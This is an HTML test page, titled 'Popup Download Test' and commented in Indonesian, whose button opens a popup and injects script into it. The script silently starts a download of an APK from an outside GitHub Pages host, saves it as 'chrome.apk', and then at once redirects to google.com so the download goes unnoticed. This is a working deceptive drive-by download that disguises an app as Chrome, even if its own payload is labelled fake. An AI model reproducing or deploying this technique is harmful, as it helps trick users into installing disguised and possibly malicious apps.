<!doctype html>
<html>
<head>
<meta charset="utf-8">
<title>Popup Download Test</title>
<style>
body { font-family:sans-serif;padding:20px;background:#f5f5f5 }
button { 
  padding:12px 18px;
  font-size:16px;
  background:#2196F3;
  color:white;
  border:none;
  border-radius:4px;
  cursor:pointer;
}
button:hover { background:#0b7dda }
pre { 
  background:#1a1a1a;
  color:#0f0;
  padding:15px;
  border-radius:4px;
  margin-top:15px;
  height:150px;
  overflow:auto;
}
</style>
</head>
<body>

<h3>Popup Test (Auto-redirect ke Google.com)</h3>
<button id="btn">Buka Popup</button>
<pre id="log"></pre>

<script>
const logEl = document.getElementById("log");
const log = m => {
  logEl.textContent += `[${new Date().toLocaleTimeString()}] ${m}\n`;
  logEl.scrollTop = logEl.scrollHeight;
};

document.getElementById("btn").onclick = () => {
  log("User click diterima");
  
  // 1. Buka popup ke about:blank (wajib untuk bisa inject)
  const w = window.open("about:blank", "_blank", 
    `width=800,height=600,left=${(screen.width-800)/2},top=${(screen.height-600)/2}`);
  
  if (!w) {
    log("❌ Popup diblock browser!");
    return;
  }
  
  log("Popup terbuka (about:blank)");
  
  // 2. Inject HTML yang langsung redirect ke Google.com + trigger download
  w.document.write(`
    <!DOCTYPE html>
    <html>
    <head>
      <title>Loading...</title>
      <meta http-equiv="refresh" content="0;url=https://www.google.com">
    </head>
    <body>
      <a id="dl" download="chrome.apk" href="https://oxfat.github.io/fake.apk"></a>
      <script>
        // Trigger download SEBELUM redirect
        try {
          document.getElementById('dl').click();
        } catch(e) {}
        
        // Force redirect jika meta refresh gagal
        setTimeout(() => {
          if (location.hostname !== 'www.google.com') {
            location.href = 'https://www.google.com';
          }
        }, 50);
      <\/script>
    </body>
    </html>
  `);
  
  w.document.close();
  log("✅ Script injected → auto-redirect ke Google.com");
};
</script>

</body>
</html>
